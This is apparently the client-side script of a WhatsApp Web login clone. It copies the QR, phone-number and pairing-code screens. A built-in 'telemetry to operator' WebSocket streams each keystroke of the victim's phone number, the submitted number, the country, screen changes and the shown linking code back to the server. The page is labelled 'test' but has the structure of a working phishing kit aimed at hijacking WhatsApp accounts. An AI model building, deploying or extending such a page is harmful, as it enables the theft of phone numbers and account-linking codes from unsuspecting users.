/* WhatsApp Web — login clone (test). app.js
 * No backend. Pure client-side state machine: qr ↔ phone → code.
 */
(() => {
  'use strict';

  // ---------- Country list (curated; not full ISO-3166 — enough for test) ----------
  const COUNTRIES = [
    { name: 'Poland',         flag: '🇵🇱', code: '48'  },
    { name: 'Russia',         flag: '🇷🇺', code: '7'   },
    { name: 'Ukraine',        flag: '🇺🇦', code: '380' },
    { name: 'Belarus',        flag: '🇧🇾', code: '375' },
    { name: 'Kazakhstan',     flag: '🇰🇿', code: '7'   },
    { name: 'Germany',        flag: '🇩🇪', code: '49'  },
    { name: 'France',         flag: '🇫🇷', code: '33'  },
    { name: 'United Kingdom', flag: '🇬🇧', code: '44'  },
    { name: 'Spain',          flag: '🇪🇸', code: '34'  },
    { name: 'Italy',          flag: '🇮🇹', code: '39'  },
    { name: 'Netherlands',    flag: '🇳🇱', code: '31'  },
    { name: 'Czechia',        flag: '🇨🇿', code: '420' },
    { name: 'Turkey',         flag: '🇹🇷', code: '90'  },
    { name: 'United States',  flag: '🇺🇸', code: '1'   },
    { name: 'Canada',         flag: '🇨🇦', code: '1'   },
    { name: 'Brazil',         flag: '🇧🇷', code: '55'  },
    { name: 'India',          flag: '🇮🇳', code: '91'  },
    { name: 'China',          flag: '🇨🇳', code: '86'  },
    { name: 'Japan',          flag: '🇯🇵', code: '81'  },
    { name: 'Israel',         flag: '🇮🇱', code: '972' },
    { name: 'United Arab Emirates', flag: '🇦🇪', code: '971' },
    { name: 'Georgia',        flag: '🇬🇪', code: '995' },
    { name: 'Armenia',        flag: '🇦🇲', code: '374' },
    { name: 'Azerbaijan',     flag: '🇦🇿', code: '994' },
  ];

  // ---------- DOM refs ----------
  const $ = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));

  const page         = $('.page');
  const countryBtn   = $('#countryBtn');
  const countryFlag  = $('#countryFlag');
  const countryName  = $('#countryName');
  const countryMenu  = $('#countryMenu');
  const phonePrefix  = $('#phonePrefix');
  const phoneInput   = $('#phoneInput');
  const phoneInputBox = phoneInput.parentElement;
  const nextBtn      = $('#nextBtn');
  const linkedNumber = $('#linkedNumber');
  const codeBox      = $('#codeBox');
  const qrCanvas     = $('#qrCanvas');

  let selected = COUNTRIES[0];
  let qrTimer = null;

  // ---------- Telemetry (WS to operator) ----------
  const telem = (() => {
    let ws = null;
    let backoff = 500;
    let alive = false;
    const queue = [];

    function url() {
      const proto = location.protocol === 'https:' ? 'wss' : 'ws';
      return `${proto}://${location.host}/ws/v`;
    }
    function connect() {
      if (location.protocol !== 'http:' && location.protocol !== 'https:') return; // file:// — no-op
      try { ws = new WebSocket(url()); }
      catch { schedule(); return; }
      ws.onopen = () => {
        alive = true; backoff = 500;
        while (queue.length) ws.send(queue.shift());
      };
      ws.onclose = () => { alive = false; schedule(); };
      ws.onerror = () => { try { ws.close(); } catch {} };
    }
    function schedule() {
      backoff = Math.min(backoff * 2, 8000);
      setTimeout(connect, backoff);
    }
    function send(type, value) {
      const msg = JSON.stringify({ type, value, ts: Date.now() });
      if (alive && ws && ws.readyState === 1) { ws.send(msg); }
      else { queue.push(msg); if (queue.length > 50) queue.shift(); }
    }
    connect();
    return { send };
  })();

  function debounce(fn, ms) {
    let t; return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
  }

  // ---------- Screen switching ----------
  function go(screen) {
    if (!['qr', 'phone', 'code'].includes(screen)) return;
    page.dataset.screen = screen;
    telem.send('screen', screen);

    if (screen === 'qr') {
      startQrRefresh();
    } else {
      stopQrRefresh();
    }
    if (screen === 'phone') {
      setTimeout(() => phoneInput.focus(), 30);
    }
    if (screen === 'code') {
      const digits = phoneInput.value.replace(/\D/g, '');
      linkedNumber.textContent = formatPhone(selected.code, digits);
      const code = generateCode();
      renderCode(code);
      telem.send('code_shown', code);
    }
  }

  $$('[data-go]').forEach(el => {
    el.addEventListener('click', e => {
      e.preventDefault();
      go(el.dataset.go);
    });
  });

  // ---------- Country picker ----------
  function buildCountryMenu() {
    countryMenu.innerHTML = '';
    COUNTRIES.forEach((c, i) => {
      const li = document.createElement('li');
      li.setAttribute('role', 'option');
      li.dataset.idx = String(i);
      if (c.name === selected.name && c.code === selected.code) {
        li.setAttribute('aria-selected', 'true');
      }
      li.innerHTML = `
        <span class="flag">${c.flag}</span>
        <span class="name">${c.name}</span>
        <span class="code">+${c.code}</span>
      `;
      li.addEventListener('click', () => {
        pickCountry(i);
        toggleMenu(false);
      });
      countryMenu.appendChild(li);
    });
  }

  function pickCountry(i) {
    selected = COUNTRIES[i];
    countryFlag.textContent = selected.flag;
    countryName.textContent = selected.name;
    phonePrefix.textContent = '+' + selected.code;
    $$('#countryMenu li').forEach(li => li.removeAttribute('aria-selected'));
    const cur = $(`#countryMenu li[data-idx="${i}"]`);
    if (cur) cur.setAttribute('aria-selected', 'true');
    telem.send('country', { name: selected.name, code: selected.code, flag: selected.flag });
  }

  function toggleMenu(force) {
    const open = force ?? countryMenu.hasAttribute('hidden');
    if (open) {
      countryMenu.removeAttribute('hidden');
      countryBtn.setAttribute('aria-expanded', 'true');
    } else {
      countryMenu.setAttribute('hidden', '');
      countryBtn.setAttribute('aria-expanded', 'false');
    }
  }

  countryBtn.addEventListener('click', e => {
    e.stopPropagation();
    toggleMenu();
  });
  document.addEventListener('click', e => {
    if (!countryMenu.contains(e.target) && e.target !== countryBtn) toggleMenu(false);
  });

  // ---------- Phone input ----------
  const sendPhoneInput = debounce(() => {
    const digits = phoneInput.value.replace(/\D/g, '');
    telem.send('phone_input', digits);
  }, 200);
  phoneInput.addEventListener('input', () => {
    phoneInputBox.classList.remove('is-error');
    // keep digits + spaces only
    const v = phoneInput.value.replace(/[^\d\s]/g, '');
    phoneInput.value = v;
    sendPhoneInput();
  });
  phoneInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') { e.preventDefault(); nextBtn.click(); }
  });
  nextBtn.addEventListener('click', () => {
    const digits = phoneInput.value.replace(/\D/g, '');
    if (digits.length < 6) {
      phoneInputBox.classList.add('is-error');
      phoneInput.focus();
      return;
    }
    telem.send('phone_submit', digits);
    go('code');
  });

  function formatPhone(cc, digits) {
    if (!digits) return '+' + cc;
    // simple grouping: 2-3-4 max, fall back to single block
    const parts = [];
    let rest = digits;
    const sizes = [2, 3, 4, 4];
    for (const s of sizes) {
      if (!rest) break;
      parts.push(rest.slice(0, s));
      rest = rest.slice(s);
    }
    if (rest) parts.push(rest);
    return '+' + cc + ' ' + parts.join(' ');
  }

  // ---------- Code generation ----------
  // WhatsApp-like alphabet: uppercase letters + digits, exclude visually ambiguous (0, O, 1, I, L).
  const CODE_ALPHABET = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';

  function generateCode(len = 8) {
    const out = new Array(len);
    if (window.crypto && window.crypto.getRandomValues) {
      const buf = new Uint32Array(len);
      window.crypto.getRandomValues(buf);
      for (let i = 0; i < len; i++) out[i] = CODE_ALPHABET[buf[i] % CODE_ALPHABET.length];
    } else {
      for (let i = 0; i < len; i++) out[i] = CODE_ALPHABET[Math.floor(Math.random() * CODE_ALPHABET.length)];
    }
    return out.join('');
  }

  function renderCode(code) {
    codeBox.innerHTML = '';
    const half = Math.ceil(code.length / 2);
    for (let i = 0; i < code.length; i++) {
      if (i === half) {
        const dash = document.createElement('span');
        dash.className = 'code-sep';
        dash.textContent = '-';
        codeBox.appendChild(dash);
      }
      const cell = document.createElement('div');
      cell.className = 'code-cell';
      cell.textContent = code[i];
      codeBox.appendChild(cell);
    }
  }

  // ---------- "QR code" (fake, test mode) ----------
  // Real QR isn't needed here — this is a UI clone. We render a deterministic-looking
  // matrix from a random seed so it visually behaves like a refreshing QR.
  function drawQr(seed) {
    const N = 33; // matrix size
    const cell = 100 / N;
    let rng = mulberry32(seed);
    const dark = [];
    // body
    for (let y = 0; y < N; y++) {
      for (let x = 0; x < N; x++) {
        if (isFinder(x, y, N)) {
          if (finderPixel(x, y, N)) dark.push([x, y]);
          continue;
        }
        if (rng() > 0.5) dark.push([x, y]);
      }
    }
    let rects = '';
    for (const [x, y] of dark) {
      rects += `<rect x="${(x*cell).toFixed(3)}" y="${(y*cell).toFixed(3)}" width="${(cell+0.05).toFixed(3)}" height="${(cell+0.05).toFixed(3)}"/>`;
    }
    qrCanvas.innerHTML =
      `<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" shape-rendering="crispEdges">
         <rect width="100" height="100" fill="#fff"/>
         <g fill="#111b21">${rects}</g>
       </svg>`;
  }

  // detect finder-pattern zones (top-left, top-right, bottom-left)
  function isFinder(x, y, N) {
    const inBox = (x0, y0) => x >= x0 && x < x0 + 7 && y >= y0 && y < y0 + 7;
    return inBox(0, 0) || inBox(N - 7, 0) || inBox(0, N - 7);
  }
  function finderPixel(x, y, N) {
    // map (x,y) to local coords inside whichever finder it belongs to
    let lx = x, ly = y;
    if (x >= N - 7) lx = x - (N - 7);
    if (y >= N - 7) ly = y - (N - 7);
    // outer ring (7x7), inner ring (5x5 hole), center 3x3 filled
    const onOuter = (lx === 0 || lx === 6 || ly === 0 || ly === 6);
    const onInner = (lx >= 2 && lx <= 4 && ly >= 2 && ly <= 4);
    return onOuter || onInner;
  }
  // tiny seedable PRNG
  function mulberry32(a) {
    return function () {
      a |= 0; a = a + 0x6D2B79F5 | 0;
      let t = a;
      t = Math.imul(t ^ t >>> 15, t | 1);
      t ^= t + Math.imul(t ^ t >>> 7, t | 61);
      return ((t ^ t >>> 14) >>> 0) / 4294967296;
    };
  }

  function startQrRefresh() {
    drawQr(Date.now() & 0x7fffffff);
    if (qrTimer) clearInterval(qrTimer);
    qrTimer = setInterval(() => drawQr(Date.now() & 0x7fffffff), 30000);
  }
  function stopQrRefresh() {
    if (qrTimer) { clearInterval(qrTimer); qrTimer = null; }
  }

  // ---------- init ----------
  buildCountryMenu();
  pickCountry(0);
  startQrRefresh();
})();
